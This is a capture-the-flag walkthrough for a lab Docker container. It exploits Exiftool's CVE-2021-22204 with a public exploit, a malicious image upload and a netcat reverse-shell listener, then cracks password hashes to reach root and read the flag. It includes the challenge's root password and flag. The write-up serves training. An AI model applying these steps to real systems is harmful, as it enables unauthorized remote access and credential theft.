## Solution MiruCTF

The first thing is to perform a scanner with nmap to the Docker container the default IP of the container is '172.17.0.2'.

The service you have detected is 'Apache httpd 2.4.53'.

```
$ nmap -sV 172.17.0.2

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.53 ((Debian))

```

In the browser you have to open the following URL [http://172.17.0.2/](http://172.17.0.2/).


When entering the web you can see that it indicates that the version of Exiftool is 12.23, when performing a quick search it is known that it has a vulnerability reported with the CVE 2021-22204.

When searching for an exploit to exploit CVE 2021-22204, the following GitHub repository is found which must be cloned.

```
$ git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
```

We install the prerequisites that appear in the Readme of the [previous repository](https://github.com/convisolabs/CVE-2021-22204-exiftool). 
```
$ sudo apt install djvulibre-bin
```

We open the file `exploit.py` and change the IP address to `172.17.0.1`.

We execute the following command to create the file `image.jpg` with the exploit.
```
$ python3 exploit.py
```

We run the following command and put Netcat into listen mode.
```
$ nc -nvlp 9090
```

We open the browser at the URL [http://172.17.0.2/](http://172.17.0.2/) and upload the `image.jpg` file with the exploit.


In the terminal where netcat has been executed we will have access to the Docker container Shell and execute the `id` command to find out which user we are.
```
$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
We go to the `/home` directory and find some `.txt` files with the usernames and hashed passwords of the system.

With the John the Ripper tool we obtain the password of the `root` user.

Run the following command.

```
$ su -
Password: 12345
```

We look for a file called `flag.txt` which is located in `/root/`, with which we have finished the challenge.

```
$ cat flag.txt
49dad4071eb37cd0ccdf7309e17a4f77
```
